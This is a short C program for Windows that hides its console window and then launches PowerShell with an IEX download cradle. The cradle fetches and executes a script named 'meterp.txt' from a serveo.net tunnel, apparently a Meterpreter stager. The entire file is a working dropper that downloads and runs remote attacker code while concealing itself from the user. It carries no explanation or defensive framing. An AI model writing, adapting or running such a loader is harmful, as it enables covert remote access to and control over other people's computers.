#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[2100];

strcpy(command, "cmd.exe /b /c powershell -NoExit \"IEX ((New-Object System.Net.WebClient).DownloadString(\'http://serveo.net:serveo_port/meterp.txt\'))\"");
 system(command);
return 0;
}

